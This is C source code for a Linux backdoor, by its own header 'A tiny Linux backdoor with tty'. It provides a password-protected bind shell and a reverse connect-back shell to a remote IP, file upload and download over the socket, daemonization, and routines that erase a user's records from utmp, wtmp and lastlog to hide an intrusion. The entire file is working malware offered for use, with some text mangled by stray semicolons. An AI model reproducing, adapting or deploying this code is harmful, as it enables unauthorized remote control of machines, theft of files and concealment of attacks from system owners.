/*

*   A tiny Linux backdoor with tty V. 1.2

*   Based on bindtty , thx sd

*   Code by W.Z.T     <wzt@xsec.org>

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <errno.h>
#include <dirent.h>
#include <signal.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <utmp.h>
#include <lastlog.h>
#include <pwd.h>
#include <sys/socket.h>

#define  HOME "/tmp"
#define  TEMP_FILE        "tthacker"
#define  CREATMODE        0777
#define  TIOCSCTTY        0x540E
#define  TIOCGWINSZ       0x5413
#define  TIOCSWINSZ       0x5414
#define  ECHAR            0x1d
#define  BUF              32768

#define  MAXENV          256
#define  ENVLEN          256
    
#define  WTMP_NAME        "/var/log/wtmp"
#define  UTMP_NAME        "/var/run/utmp"
#define  LASTLOG_NAME     "/var/log/lastlog"

#define  MAXARGS          50
#define  MAXFD              5
#define  SLEEP_TIME       10  /* !!connect back time */
#define  ARGLEN           300

#define  USAGES1          "\nconnected successful.welcome to use xsec's bindshell.Good Luck:)\n\n"
#define  ERRORS           "\nDo you want to get my shell? FUCK------->"
#define  PASSWD           "tthacker"     /* !!default password  */
#define  LOGIN              "login:"

#define  MAXNAME        100
#define  BUF_SIZE        4096
#define  TEMP_NAME        "tthacker"
      
void shell(int sock_id,int sock_fd);
void myshell(void);
void connect_back(char *hosts,char *port);    
void bindshell(char *port);    
void send_file(int sock_id);  
void save_file(int client_fd);
void get_tty(int num, char *base, char *buf);
void sig_child(int i);
void hangout(int i);
void cannot_stop_me(void);
void clearn_utmp(char *who);
void clearn_wtmp(char *who);
void clearn_lastlog(char *who);
void usage(char *pro);
int  open_tty(int *tty, int *pty);

struct winsize {
   unsigned short ws_row;
   unsigned short ws_col;
   unsigned short ws_xpixel;
   unsigned short ws_ypixel;
};

char command[ARGLEN];
char error1[MAXARGS];
char type1[MAXARGS];
char type2[MAXARGS];
char check[ARGLEN];

int fp;

int flag_g=0;
int flag_u=0;

char send_filename[MAXNAME];
char save_filename[MAXNAME];

int main(int argc,char *argv[])
{
    if(argc==1){
        usage(argv[0]);
    }
    if(argc==2){
        bindshell(argv[1]);
    }
    if(argc==3&&!strcmp(argv[1],"-c")){
        clearn_utmp(argv[2]);
        clearn_wtmp(argv[2]);
        clearn_lastlog(argv[2]);
    }
    if(argc==3&&strcmp;(argv[1],"-c")){
        connect_back(argv[1],argv[2]);
    }
    if(argc==4&&!strcmp(argv[1],"-g")){    
        flag_g=1;
        strcpy(save_filename,argv[3]);
        bindshell(argv[2]);
    }
    if(argc==5&&!strcmp(argv[1],"-u")){
        flag_u=1;
        strcpy(send_filename,argv[4]);
        connect_back(argv[2],argv[3]);
    }
    
    return 0;
}

void usage(char *pro)
{
    fprintf(stdout,"Usage: \n\n");
    fprintf(stdout,"Bindshell    : %s <port>\n",pro);
    fprintf(stdout,"Connect back    : %s <remote ip> <port>\n",pro);
    fprintf(stdout,"Save file    : %s -g <port> <filename>\n",pro);
    fprintf(stdout,"Send file    : %s -u <remote ip> <port> <filename>\n",pro);
    fprintf(stdout,"Clean log(root)    : %s -c <username>\n",pro);
    exit(0);
}

void connect_back(char *hosts,char *port)
{
    struct sockaddr_in serv_addr;
    struct hostent     *host;
    int sock_fd,pid;

    if(flag_u!=1){
     printf("Daemon is starting...");
      fflush(stdout);
      pid = fork();
      if (pid !=0 ) {
          printf("OK, pid = %d\n", pid);
          exit(0);
      }
                                                                                                
      setsid();
      chdir("/");
      pid = open("/dev/null", O_RDWR);
      dup2(pid, 0);
      dup2(pid, 1);
      dup2(pid, 2);
      close(pid);
      signal(SIGHUP, SIG_IGN);
      signal(SIGCHLD, sig_child);
    }
    
    while(1){
        if((host=gethostbyname(hosts))==NULL){
            herror("gethostbyname");
            exit(1);
        }

        if((sock_fd=socket(AF_INET,SOCK_STREAM,0))==-1){
            perror("socket");
            exit(1);
        }

        serv_addr.sin_family=AF_INET;
        serv_addr.sin_port=htons(atoi(port));
        serv_addr.sin_addr=*((struct in_addr *)host->h_addr);
        
        bzero(&(serv_addr.sin_zero),8);

        strcpy(error1,(char *)inet_ntoa(INADDR_ANY));
            error1[strlen(error1)]='\0';

        if(connect(sock_fd,(struct sockaddr *)&serv;_addr,sizeof(struct sockaddr))==-1){
            perror("connect");
            close(sock_fd);
            continue;
        }
        
        if(flag_u==1){
            send_file(sock_fd);
            exit(0);
        }
        else{
            shell(sock_fd,0);
            sleep(SLEEP_TIME);
            close(sock_fd);
        }
     }
}

void bindshell(char *port)
{
    int pid;
    int  sin_size;
    int sock_fd,client_fd;
    struct sockaddr_in my_addr;
     struct sockaddr_in remote_addr;

    if((sock_fd=socket(AF_INET,SOCK_STREAM,0))==-1){
        perror("socket");
        exit(1);
    }
   
    my_addr.sin_family=AF_INET;
    my_addr.sin_port=htons(atoi(port));
    my_addr.sin_addr.s_addr=INADDR_ANY;

    bzero(&(my_addr.sin_zero),8);

    if(bind(sock_fd,(struct sockaddr *)&my;_addr,sizeof(struct sockaddr))==-1){
        perror("bind");
        exit(1);
    }

    if(listen(sock_fd,MAXFD)==-1){
        perror("listen");
        close(sock_fd);
        exit(0);
    }

    strcpy(error1,(char *)inet_ntoa(remote_addr));
    error1[strlen(error1)]='\0';


    printf("Daemon is starting...");
    fflush(stdout);
    pid = fork();
    if (pid !=0 ) {
        printf("OK, pid = %d\n", pid);
        exit(0);
     }
   
      setsid();
      chdir("/");
      pid = open("/dev/null", O_RDWR);
      dup2(pid, 0);
      dup2(pid, 1);
      dup2(pid, 2);
      close(pid);
      signal(SIGHUP, SIG_IGN);
      signal(SIGCHLD, sig_child);
    
    while(1){
        sin_size=sizeof(struct sockaddr_in);
        if((client_fd=accept(sock_fd,(struct sockaddr *)&remote;_addr,&sin;_size))==-1){
            perror("accept");
            close(client_fd);
            continue;
        }
        if(flag_g==1){
            save_file(client_fd);
            exit(0);    
        }
        else{
            shell(client_fd,sock_fd);
        }
        close(client_fd);
    }
}

void send_file(int sock_id)
{
    int fd,n_char;    
    char buffer[BUF_SIZE];
    
    if((fd=open(send_filename,O_RDONLY))<0){
        fprintf(stderr,"Cannot open %s\n",send_filename);
        exit(1);
    }

    printf("[+] Open file %s ok.\n",send_filename);    
    while((n_char=read(fd,buffer,BUF_SIZE))>0){
        write(sock_id,buffer,n_char);
        printf("Send %d bytes ok.\n",n_char);
    }
        
    fprintf(stdout,"send file %s ok.\n",send_filename);
    close(fd);
}

void save_file(int client_fd)
{
    int fd,n_char;
    char buffer[BUF_SIZE];
    char send_ok[BUF_SIZE]="save file ok.\n";
    char file_name[MAXNAME];
    
    if((fd=creat(save_filename,CREATMODE))<0){
        fprintf(stderr,"Cannot create % .n",save_filename);
        exit(1);
    }
    
    printf("[+] Open file %s ok.\n",save_filename);
    while((n_char=read(client_fd,buffer,BUF_SIZE))>0){
        write(fd,buffer,n_char);
        printf("Save %d bytes ok.\n",n_char);
    }

    write(client_fd,send_ok,sizeof(send_ok));        
    close(fd);
}

void shell(int sock_id,int sock_fd)
{
    fd_set     fds;
    struct  winsize ws;
    char     buf[BUF];
    char    msg[] = "Can't fork pty, bye!\n";
    char     *argv[] = {"sh", "-i", NULL};
    char     *envp[MAXENV];
     char     envbuf[(MAXENV+2) * ENVLEN];
     char     home[MAXENV];
    int     i,j,k,slen,rlen,count;
    int     subshell,tty,pty;
       unsigned char *p, *d;
       unsigned char wb[5];
   
    write(sock_id,LOGIN,sizeof(LOGIN));
    read(sock_id,check,sizeof(check));

    if(strstr(check,PASSWD)!=NULL){
        if(!fork()){
            write(sock_id,USAGES1,strlen(USAGES1));

//stealing code from bindtty                    

            envp[0]=home;
               sprintf(home, "HOME=/tmp", HOME);
                   j = 0;
                   do {
                   i = read(sock_id, &envbuf;[j * ENVLEN], ENVLEN);
                   envp[j+1] = &envbuf;[j * ENVLEN];
                   j++;
                   if ((j >= MAXENV) || (i < ENVLEN)) break;
               } while (envbuf[(j-1) * ENVLEN] != '\n');
               envp[j+1] = NULL;

               setpgid(0, 0);

               if (!open_tty(&tty;, &pty;)) {
                   write(sock_id, msg, strlen(msg));
                   close(sock_id);
                   exit(0);
               }

            subshell = fork();
               if (subshell == 0) {
                   close(pty);
                       setsid();
                 ioctl(tty, TIOCSCTTY);
                   close(sock_id);
                    close(sock_fd);
                       signal(SIGHUP, SIG_DFL);
                   signal(SIGCHLD, SIG_DFL);
                      dup2(tty,0);
                      dup2(tty,1);
                      dup2(tty,2);
                       close(tty);
                   execve("/bin/sh", argv, envp);
               }

               close(tty);

               signal(SIGHUP, hangout);
               signal(SIGTERM, hangout);    
                
               while (1) {
                   FD_ZERO(&fds;);
                   FD_SET(pty, &fds;);
                   FD_SET(sock_id, &fds;);
                   if (select((pty > sock_id) ? (pty+1) : (sock_id+1),&fds;, NULL, NULL, NULL) < 0){
                       break;
                   }
                   if (FD_ISSET(pty, &fds;)) {
                       count = read(pty, buf, BUF);
                       if (count <= 0) break;
                       if (write(sock_id, buf, count) <= 0) break;
                   }
                   if (FD_ISSET(sock_id, &fds;)) {
                       d = buf;
                       count = read(sock_id, buf, BUF);
                       if (count <= 0) break;

                       p = memchr(buf, ECHAR, count);
                       if (p) {
                               rlen = count - ((long) p - (long) buf);

                           if (rlen > 5) rlen = 5;
                                      memcpy(wb, p, rlen);
                           if (rlen < 5) {
                                   read(sock_id, &wb;[rlen], 5 - rlen);
                           }

                           ws.ws_xpixel = ws.ws_ypixel = 0;
                           ws.ws_col = (wb[1] << 8) + wb[2];
                           ws.ws_row = (wb[3] << 8) + wb[4];
                           ioctl(pty, TIOCSWINSZ, &ws;);
                           kill(0, SIGWINCH);

                           write(pty, buf, (long) p - (long) buf);
                           rlen = ((long) buf + count) - ((long)p+5);
                           if (rlen > 0)
                    write(pty, p+5, rlen);
                     }
                        else
                           if (write(pty, d, count) <= 0) break;
                      }
                    }
                   close(sock_id);
                   close(sock_fd);
                   close(pty);

                   waitpid(subshell, NULL, 0);
                   vhangup();
                   exit(0);
                  
        }
    }
    else{
        write(sock_id,ERRORS,strlen(ERRORS));
        write(sock_id,error1,strlen(error1));
        close(sock_id);
    }
    close(sock_id);
}        

//stealing code from bindtty:)


void    get_tty(int num, char *base, char *buf)
{
       char    series[] = "pqrstuvwxyzabcde";
       char    subs[] = "0123456789abcdef";
       int pos = strlen(base);
       strcpy(buf, base);
       buf[pos] = series[(num >> 4) & 0xF];
       buf[pos+1] = subs[num & 0xF];
       buf[pos+2] = 0;
}


int open_tty(int *tty, int *pty)
{
       char    buf[512];
       int i, fd;

       fd = open("/dev/ptmx", O_RDWR);
       close(fd);

       for (i=0; i < 256; i++) {
           get_tty(i, "/dev/pty", buf);
           *pty = open(buf, O_RDWR);
           if (*pty < 0) continue;
           get_tty(i, "/dev/tty", buf);
           *tty = open(buf, O_RDWR);
           if (*tty < 0) {
                   close(*pty);
                       continue;
           }
           return 1;
       }
       return 0;
}


void sig_child(int i)
{
       signal(SIGCHLD, sig_child);
       waitpid(-1, NULL, WNOHANG);
}

void hangout(int i)
{
       kill(0, SIGHUP);
       kill(0, SIGTERM);
}

void cannot_stop_me(void)
{
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);

    signal(SIGCHLD,SIG_IGN);
    signal(SIGHUP,SIG_IGN);
    signal(SIGTERM,SIG_IGN);
    signal(SIGINT,SIG_IGN);
    signal(SIGKILL,SIG_IGN);
    if(fork())
        exit(0);
}

void clearn_utmp(char *who)
{
       struct utmp ent;
                                                                 
       if((fp=open(UTMP_NAME,O_RDWR))<0){
               perror("open");
       }
       while(read(fp,&ent;,sizeof(ent))>0){
               if(!strncmp(ent.ut_user,who,sizeof(ent))){
                       bzero((char *)&ent;,sizeof(ent));
                       lseek(fp,-(sizeof(ent)),SEEK_CUR);
                       write(fp,&ent;,sizeof(ent));
               }
       }
       printf("clearn %s done.\n",UTMP_NAME);
}

void clearn_lastlog(char *who)
{
       struct passwd *pwd;
       struct lastlog new;
                                                                 
       if((pwd=getpwnam(who))==NULL){
               printf("No such user.\n");
               exit(0);
       }
                                                                 
       if((fp=open(LASTLOG_NAME,O_RDWR))<0){
               printf("clearn %s failed\n",LASTLOG_NAME);
       }
       bzero((char *)&new;,sizeof(new));
       lseek(fp,(long)pwd->pw_uid*sizeof(struct lastlog),0);
       write(fp,&new;,sizeof(new));
       printf("clearn %s done.\n",LASTLOG_NAME);
       close(fp);
}

void clearn_wtmp(char *who)
{
       struct utmp ent;
                                                                 
       if((fp=open(WTMP_NAME,O_RDWR))<0){
               printf("Can't open the file %s \n",WTMP_NAME);
       }
       while(read(fp,&ent;,sizeof(ent))>0){
               if(!strncmp(ent.ut_user,who,sizeof(ent))){
                       bzero((char *)&ent;,sizeof(ent));
                       lseek(fp,-(sizeof(ent)),SEEK_CUR);
                       write(fp,&ent;,sizeof(ent));
               }
       }
       printf("claern %s done.\n",WTMP_NAME);
       close(fp);
}
